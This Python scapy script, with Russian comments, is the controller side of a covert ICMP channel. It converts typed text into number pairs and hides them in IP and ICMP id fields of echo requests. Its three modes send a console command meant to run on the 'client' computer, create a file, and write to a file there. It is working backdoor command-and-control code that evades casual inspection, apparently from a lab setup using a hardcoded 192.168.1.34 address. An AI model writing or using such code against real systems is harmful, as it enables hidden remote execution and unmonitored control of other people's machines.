from scapy.all import *
import socket

dictionary = {'A':'01','B':'02','C':'03','D':'04','E':'05','F':'06','G':'07','H':'08','I':'09','J':'10','K':'11','L':'12','M':'13','N':'14','O':'15','P':'16','Q':'17','R':'18','S':'19','T':'20','U':'21','V':'22','W':'23','X':'24','Y':'25','Z':'26','a':'27','b':'28','c':'29','d':'30','e':'31','f':'32','g':'33','h':'34','i':'35','j':'36','k':'37','l':'38','m':'39','n':'40','o':'41','p':'42','q':'43','r':'44','s':'45','t':'46','u':'47','v':'48','w':'49','x':'50','y':'51','z':'52','1':'53','2':'54','3':'55','4':'56','5':'57','6':'58','7':'59','8':'60','9':'61',' ':'62','"':'63','-':'64','.':'65',':':'66',',':'67','(':'68',')':'69','/':'70'}
def converter(code): #переводит текст в числа и возвращает массив из чисел по 4 цифры
    code = list(code)
    s = ''
    k = []
    n = []
    m = 0
    for i in code:
        k.append(dictionary.get(i))
    
    for i in k:
        s+=i
    if(len(k)%2==0):
        while(m<len(k)):
            if(m%2==0):
                p = k[m]+k[m+1]
                n.append(p)
                m = m+1
            else:
                m = m+1
                continue
    else:
        while(m<len(k)-1):
            if(m%2==0):
                p = k[m]+k[m+1]
                n.append(p)
                m = m+1
            else:
                m+=1
                continue
        n.append(k[len(k)-1]+"00")
    return n

print("Choose command:")
print("1.Command in console")
print("2.Create file")
print("3.Write in file")
print(socket.gethostbyname(socket.getfqdn()))
action = input()
#отправляем одну команду которая выполнится на компьютере клиента
if(action == "1"):
    
    pkt = IP(src=socket.gethostbyname(socket.getfqdn()), dst=socket.gethostbyname(socket.getfqdn()),id = 1) / ICMP(type = 8)
    send(pkt)
    print("Write command:")
    com = converter(input())
    i = 0
    print(com)
    #раскладываем все буквы в пакеты и отправлем
    #если количество букв четное
    if(len(com)%2==0):     
        while(i<len(com)):
            if(i%2 == 0):
                pkt = IP(src="192.168.1.34", dst="192.168.1.34",id = int(com[i])) / ICMP(type = 8,id = int(com[i+1]))
                send(pkt)
                print(com[i],com[i+1])
            if(i==len(com)-1):
                break
            i+=1      
    #если количество букв нечетное      
    else:
        i = 0
        while(i<len(com)-1):
            if(i%2 == 0):
                pkt = IP(src="192.168.1.34", dst="192.168.1.34",id = int(com[i])) / ICMP(type = 8,id = int(com[i+1]))
            
                send(pkt)
                print(com[i],com[i+1])
                i += 1
            else:
                i += 1
                continue    
        pkt = IP(src="192.168.1.34", dst="192.168.1.34",id = int(com[len(com)-1])) / ICMP(type = 8)
    
        send(pkt)
        print(com[len(com)-1])
#создаем файл 
if(action == "2"):
    pkt = IP(src=socket.gethostbyname(socket.getfqdn()), dst=socket.gethostbyname(socket.getfqdn()),id = 2) / ICMP(type = 8)
    send(pkt)
    print("Write filename:")
    filename = input()
    filename = converter(filename)
    i = 0
    if(len(filename)%2==0):     
        while(i<len(filename)):
            if(i%2 == 0):
                pkt = IP(src=socket.gethostbyname(socket.getfqdn()), dst=socket.gethostbyname(socket.getfqdn()),id = int(filename[i])) / ICMP(type = 8,id = int(filename[i+1]))
                send(pkt)
                print(filename[i],filename[i+1])
            if(i==len(filename)-1):
                break
            i+=1      
    #если количество букв нечетное      
    else:
        i = 0
        while(i<len(filename)-1):
            if(i%2 == 0):
                pkt = IP(src=socket.gethostbyname(socket.getfqdn()), dst=socket.gethostbyname(socket.getfqdn()),id = int(filename[i])) / ICMP(type = 8,id = int(filename[i+1]))
            
                send(pkt)
                print(filename[i],filename[i+1])
                i += 1
            else:
                i += 1
                continue    
        pkt = IP(src=socket.gethostbyname(socket.getfqdn()), dst=socket.gethostbyname(socket.getfqdn()),id = int(filename[len(filename)-1])) / ICMP(type = 8)
    
        send(pkt)
        print(filename[len(filename)-1])
if(action == "3"):
    pkt = IP(src=socket.gethostbyname(socket.getfqdn()), dst=socket.gethostbyname(socket.getfqdn()),id = 3) / ICMP(type = 8)
    send(pkt)
    print("Write filename:")
    filename = input()
    filename = converter(filename)
    i = 0
    if(len(filename)%2==0):     
        while(i<len(filename)):
            if(i%2 == 0):
                pkt = IP(src=socket.gethostbyname(socket.getfqdn()), dst=socket.gethostbyname(socket.getfqdn()),id = int(filename[i])) / ICMP(type = 8,id = int(filename[i+1]))
                send(pkt)
                print(filename[i],filename[i+1])
            if(i==len(filename)-1):
                break
            i+=1      
    #если количество букв нечетное      
    else:
        i = 0
        while(i<len(filename)-1):
            if(i%2 == 0):
                pkt = IP(src=socket.gethostbyname(socket.getfqdn()), dst=socket.gethostbyname(socket.getfqdn()),id = int(filename[i])) / ICMP(type = 8,id = int(filename[i+1]))
            
                send(pkt)
                print(filename[i],filename[i+1])
                i += 1
            else:
                i += 1
                continue    
        pkt = IP(src=socket.gethostbyname(socket.getfqdn()), dst=socket.gethostbyname(socket.getfqdn()),id = int(filename[len(filename)-1])) / ICMP(type = 8)
    
        send(pkt)
        print(filename[len(filename)-1])
